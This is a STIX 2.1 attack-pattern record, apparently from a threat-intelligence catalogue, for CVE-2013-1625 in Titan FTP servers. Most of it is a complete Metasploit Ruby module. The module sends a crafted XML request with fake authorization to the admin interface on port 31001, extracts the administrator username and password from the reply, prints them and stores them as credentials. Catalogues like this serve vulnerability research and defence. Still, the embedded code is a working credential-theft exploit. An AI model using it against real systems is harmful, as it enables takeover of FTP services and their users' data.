{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85c30410-8c9f-401f-a88f-eabdb7151dfb",
    "created": "2024-08-14T16:30:36.143419Z",
    "modified": "2024-08-14T16:30:36.143422Z",
    "name": "Titan FTP Administrative Password Disclosure",
    "description": " On Titan FTP servers prior to version 9.14.1628, an attacker can retrieve the username and password for the administrative XML-RPC interface, which listens on TCP Port 31001 by default, by sending an XML request containing bogus authentication information. After sending this request, the server responds with the legitimate username and password for the service. With this information, an attacker has complete control over the FTP service, which includes the ability to add and remove FTP users, as well as add, remove, and modify available directories and their permissions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/titan_ftp_admin_pwd.rb",
            "external_id": "titan_ftp_admin_pwd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1625"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Titan FTP Administrative Password Disclosure',\n      'Description' => %q{\n        On Titan FTP servers prior to version 9.14.1628, an attacker can\n      retrieve the username and password for the administrative XML-RPC\n      interface, which listens on TCP Port 31001 by default, by sending an\n      XML request containing bogus authentication information. After sending\n      this request, the server responds with the legitimate username and\n      password for the service. With this information, an attacker has\n      complete control over the FTP service, which includes the ability to\n      add and remove FTP users, as well as add, remove, and modify\n      available directories and their permissions.\n      },\n      'Author'      =>\n        [\n          'Spencer McIntyre'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-1625' ]\n        ]\n    )\n\n    register_options([Opt::RPORT(31001)])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi(\n      {\n        'uri'       => '/admin.dll',\n        'method'    => 'POST',\n        'headers'   => {\n          'SRT-WantXMLResponses' => 'true',\n          'SRT-XMLRequest'       => 'true',\n          'Authorization'        => 'Basic FAKEFAKE'\n        },\n        'data'      => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'\n      })\n    return if not res\n\n    if res.code == 400\n      vprint_status(\"#{ip}:#{datastore['RPORT']} - Server Responeded 400, It's Likely Patched\")\n      return\n    elsif res.code != 200\n      vprint_status(\"#{ip}:#{datastore['RPORT']} - Server Responeded With An Unknown Response Code Of #{res.code}\")\n      return\n    end\n\n    xml_data = res.body.strip\n    resp_root = REXML::Document.new(xml_data).root\n\n    srresponse = resp_root.elements.to_a(\"//SRResponse\")[0]\n    srdomainparams = srresponse.elements.to_a(\"//SRDomainParams\")[0]\n\n    info = {}\n    srdomainparams.elements.each do |node|\n      case node.name\n        when \"DomainName\"\n          info[:domain] = Rex::Text.uri_decode(node.text)\n        when \"BaseDataDir\"\n          info[:basedir] = Rex::Text.uri_decode(node.text)\n        when \"CreationDate\"\n          info[:username] = Rex::Text.uri_decode(node.text)\n        when \"CreationTime\"\n          info[:password] = Rex::Text.uri_decode(node.text)\n      end\n    end\n\n    if (info[:username] and info[:password])\n      if (info[:domain] and info[:basedir])\n        print_good(\"#{ip}:#{datastore['RPORT']} - Domain: #{info[:domain]}\")\n        print_good(\"#{ip}:#{datastore['RPORT']} - Base Directory: #{info[:basedir]}\")\n      end\n      print_good(\"#{ip}:#{datastore['RPORT']} - Admin Credentials: '#{info[:username]}:#{info[:password]}'\")\n      report_cred(\n        ip: ip,\n        port: datastore['RPORT'],\n        user: info[:username],\n        password: info[:password],\n        service_name: 'ftp'\n      )\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}